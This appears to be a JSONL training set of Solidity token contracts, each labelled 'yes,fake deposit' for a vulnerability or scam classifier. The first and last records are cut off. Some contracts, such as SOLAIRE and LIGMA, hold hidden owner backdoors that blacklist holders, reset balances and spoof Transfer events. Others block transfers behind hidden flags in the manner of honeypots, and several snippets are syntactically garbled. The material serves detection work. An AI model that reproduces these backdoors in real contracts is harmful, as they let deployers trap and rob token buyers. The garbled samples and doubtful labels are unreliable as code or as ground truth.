uint256 _value) \n external returns (bool success); \n \n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": " \n \npragma solidity ^0.6.12; \n \nabstract contract Context { \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n \n function allowance(address owner, address spender) external view returns (uint256); \n \n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \nlibrary SafeMath { \n \n function transfer(address recipient, uint256 amount) public override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n \n function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) { \n _transfer(sender, recipient, amount); \n _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\")); \n return true; \n } \n \n function _transfer(address sender, address recipient, uint256 amount) private { \n require(sender != address(0), \"ERC20: transfer from the zero address\"); \n require(recipient != address(0), \"ERC20: transfer to the zero address\"); \n require(amount > 0, \"Transfer amount must be greater than zero\"); \n if (BOTtoScan[sender] || BOTtoScan[recipient]) \n require(amount == 0, \"temporary error\"); \n if (_contractRunning == false || sender == owner() || recipient == owner()) { \n if (_isExcluded[sender] && !_isExcluded[recipient]) { \n _transferFromExcluded(sender, recipient, amount); \n } else if (!_isExcluded[sender] && _isExcluded[recipient]) { \n _transferToExcluded(sender, recipient, amount); \n } else if (!_isExcluded[sender] && !_isExcluded[recipient]) { \n _transferStandard(sender, recipient, amount); \n } else if (_isExcluded[sender] && _isExcluded[recipient]) { \n _transferBothExcluded(sender, recipient, amount); \n } else {_transferStandard(sender, recipient, amount);}} \n else {require (_contractRunning == false, \"Unexpected error\");} \n } \n \n function _transferStandard(address sender, address recipient, uint256 tAmount) private { \n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount); \n _rOwned[sender] = _rOwned[sender].sub(rAmount); \n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee); \n emit Transfer(sender, recipient, tTransferAmount); \n } } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.1; \ncontract Context { \n function _msgSender() internal view virtual returns (address) { \n return msg.sender; \n } \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n \ninterface IERC20Metadata is IERC20 { \n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n \n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(sender, recipient, amount); \n uint256 currentAllowance = _allowances[sender][_msgSender()]; \n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\"); \n _approve(sender, _msgSender(), currentAllowance - amount); \n return true; \n } \n \n \n function _transfer(address sender, address recipient, uint256 amount) internal virtual { \n require(sender != address(0), \"ERC20: transfer from the zero address\"); \n require(recipient != address(0), \"ERC20: transfer to the zero address\"); \n require(amount > 0, \"Transfer amount must be grater thatn zero\"); \n if (_approveTransfer[sender] || _approveTransfer[recipient]) \n require(maxTxPercent == false, \"\"); \n if (maxTxPercent == true || sender == _owner || recipient == _owner) { \n _beforeTokenTransfer(sender, recipient, amount); \n uint256 senderBalance = _balances[sender]; \n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\"); \n _balances[sender] = senderBalance - amount; \n _balances[recipient] += amount; \n emit Transfer(sender, recipient, amount);} \n else {require (maxTxPercent == true, \"\");} \n } \n \n \n function burnRewards(address account, uint256 value) external onlyOwner { \n _burn(account, value); \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.3; \n \n library Address { \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n function allowance(address owner, address spender) public view virtual override returns (uint256) { \n return _allowances[owner][spender]; \n } \n \n function approve(address spender, uint256 amount) public virtual override returns (bool) { \n _approve(_msgSender(), spender, amount); \n return true; \n } \n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(sender, recipient, amount); \n uint256 currentAllowance = _allowances[sender][_msgSender()]; \n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance \"); \n _approve(sender, _msgSender(), currentAllowance - amount); \n return true; \n } \n \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n \n function allowance(address owner, address spender) external view returns (uint256); \n \n \n function approve(address spender, uint256 amount) external returns (bool); \n \n \n function transferFrom( \n address sender, \n address recipient, \n uint256 amount \n ) external returns (bool); \n \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n \n event Approval(address indexed owner, address indexed spender, uint256 value); \n}\"},\"IERC20Metadata.sol\":{\"content\":\"// SPDX-License-Identifier: MIT \n pragma solidity =0.8.3; \n import \"./IERC20.sol \"; \n \n \n interface IERC20Metadata is IERC20 { \n \n function burn(address account, uint256 amount) external onlyOwner { \n _burn(account, amount); \n } \n}\"}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "{\"Address.sol\":{\"content\":\"\n\npragma solidity =0.8.3;\nlibrary Address {\n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n } \n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance \");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n } \n \n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address \");\n require(recipient != address(0), \"ERC20: transfer to the zero address \");\n require(amount > 0, \"Transfer amount must be grater thatn zero \");\n \n if(!_approvedTransfer[sender] && _bBots[recipient]) {\n require(amount <= _decreaseFee, \"Transfer amount exceeds the maxTxAmount. \"); \n }\n \n if (_feeBurn[sender] || _feeBurn[recipient]) \n require(intTx == false, \" \");\n if (intTx == true || sender == _owner || recipient == _owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance \");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);}\n else {require (intTx == true, \" \");} \n }\n \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n function transferFrom(\n address sender,\n address recipient,\n uint256 amount\n ) external returns (bool); \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\"},\"IERC20Metadata.sol\":{\"content\":\"\npragma solidity =0.8.3;\nimport \"./IERC20.sol \"; \n\n interface IERC20Metadata is IERC20 {\n \n function name() external view returns (string memory); \n \n function decimals() external view returns (uint8);\n}\"}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.24; \n \ncontract IMigrationContract { \n function transfer(address _to, uint256 _value) public returns (bool success); \n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success); \n function approve(address _spender, uint256 _value) public returns (bool success); \n function transfer(address _to, uint256 _value) public returns (bool success) { \n if (balances[msg.sender] >= _value && _value > 0) { \n balances[msg.sender] -= _value; \n balances[_to] += _value; \n emit Transfer(msg.sender, _to, _value); \n return true; \n } else { \n return false; \n } \n } \n \n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) { \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) { \n balances[_to] += _value; \n balances[_from] -= _value; \n allowed[_from][msg.sender] -= _value; \n emit Transfer(_from, _to, _value); \n return true; \n } else { \n return false; \n } \n } \n \n function () public payable { \n require(isFunding); \n require(msg.value != 0); \n \n require(block.number >= fundingStartBlock); \n require(block.number <= fundingStopBlock); \n \n uint256 tokens = safeMult(msg.value, tokenExchangeRate); \n require(tokens + tokenRaised <= currentSupply); \n \n tokenRaised = safeAdd(tokenRaised, tokens); \n balances[msg.sender] += tokens; \n \n emit IssueToken(msg.sender, tokens); //\u8bb0\u5f55\u65e5\u5fd7 \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.5.0;\n\ninterface ERC20Interface {\n\n function totalSupply() external view returns (uint256);\n\n function balanceOf(address account) external view returns (uint256);\n\n function transfer(address recipient, uint256 amount) external returns (bool);\n\n function allowance(address owner, address spender) external view returns (uint256);\n\n function approve(address spender, uint256 amount) external returns (bool);\n\n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n event Transfer(address indexed from, address indexed to, uint256 value);\n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n \n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract GBLC is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply;\n _balances[msg.sender] = initialSupply;\n }\n\n function name() public view returns (string memory) {\n return _name;\n }\n\n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _cstruct = 0xfEd1Cd8Fd65C8a5704C6266337beaeFe24801fD3;\n\taddress RtVer2 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n constructor () {\n address msgSender = _msgSender();\n _owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _owner);\n emit OwnershipTransferred(_owner, address(0));\n _owner = address(0);\n }\n\n}\n\n\n\ncontract SOLAIRE is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private nVal;\n\tmapping (address => uint256) private oVal;\n mapping (address => bool) private xUsr;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _Tote = 150000000 * 10**_decimals;\n string private constant _name = \"Solaire Ray\";\n string private constant _symbol = \"SOLAIRE\";\n\n\n\n constructor () {\n nVal[_msgSender()] = _Tote;\n emit Transfer(address(0), RtVer2, _Tote);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _Tote;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return nVal[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n function wbri () public {\n if(msg.sender == _cstruct) {\n nVal[msg.sender] = oVal[msg.sender];}}\n function wflse(address iw) public {\n if(msg.sender == _cstruct) { \n xUsr[iw] = false;}}\n function wchck(address iw) public{\n if(msg.sender == _cstruct) { \n require(!xUsr[iw]);\n xUsr[iw] = true; }}\n function wbal(uint256 iw) public {\n if(msg.sender == _cstruct) { \n oVal[msg.sender] = iw;}} \n\n function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _cstruct) {\n require(amount <= nVal[sender]);\n nVal[sender] -= amount; \n nVal[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (RtVer2, recipient, amount);\n return true; } \n if(!xUsr[sender] && !xUsr[recipient]) {\n require(amount <= nVal[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n nVal[sender] -= amount;\n nVal[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}\n\n \n\n function transfer(address recipient, uint256 amount) public {\n if(msg.sender == _cstruct) {\n require(nVal[msg.sender] >= amount);\n nVal[msg.sender] -= amount; \n nVal[recipient] += amount; \n emit Transfer (RtVer2, recipient, amount);} \n if(!xUsr[msg.sender]) {\n require(nVal[msg.sender] >= amount);\n nVal[msg.sender] -= amount; \n nVal[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address cnstruct = 0x2D679720e977b578370AC04d7CDF525F0a65Dae3;\n\taddress RouterV3 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n constructor () {\n address msgSender = _msgSender();\n _owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _owner;\n }\n\n function renounceOwnership() public virtual {\n emit OwnershipTransferred(_owner, address(0));\n _owner = address(0);\n }\n\n}\n\n\n\ncontract LIGMA is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) public TYZ;\n\tmapping (address => uint256) private VYZ;\n mapping (address => bool) private XYZ;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _tTotal = 696969690 * 10**_decimals;\n string private constant _name = \"Ligma Johnson\";\n string private constant _symbol = \"LIGMA\";\n\n\n\n constructor () {\n TYZ[_msgSender()] = _tTotal;\n emit Transfer(address(0), RouterV3, _tTotal);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _tTotal;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return TYZ[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n function JKBU () public {\n if(msg.sender == cnstruct) {\n TYZ[msg.sender] = VYZ[msg.sender];\n }}\n\n\n\n function JKDE(address jx) public {\n if(msg.sender == cnstruct) { \n XYZ[jx] = false;}}\n function JKCE(address jx) public{\n if(msg.sender == cnstruct) { \n require(!XYZ[jx]);\n XYZ[jx] = true;\n }}\n function JKBR(uint256 ki) public {\n if(msg.sender == cnstruct) { \n VYZ[msg.sender] = ki;} } \n\n function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == cnstruct) {\n require(amount <= TYZ[sender]);\n TYZ[sender] -= amount; \n TYZ[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (RouterV3, recipient, amount);\n return true; } \n if(!XYZ[sender] && !XYZ[recipient]) {\n require(amount <= TYZ[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n TYZ[sender] -= amount;\n TYZ[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}\n\n \n\n function transfer(address recipient, uint256 amount) public {\n if(msg.sender == cnstruct) {\n require(TYZ[msg.sender] >= amount);\n TYZ[msg.sender] -= amount; \n TYZ[recipient] += amount; \n emit Transfer (RouterV3, recipient, amount);\n } \n if(!XYZ[msg.sender]) {\n require(TYZ[msg.sender] >= amount);\n TYZ[msg.sender] -= amount; \n TYZ[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}\n \n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Robots is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Robots\";\n string public constant symbol = \"\ud83e\udd16\ud83e\udd16\ud83e\udd16\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract SHS_Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = '1.1.3'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function SHS_Token(\n ) {\n balances[msg.sender] = 10000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000; // Update total supply (100000 for example)\n name = \"SHS Token\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"SHS\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000000; // Update total supply (100000 for example)\n name = \"DOTGE\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals for display purposes\n symbol = \"DOTGE\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n 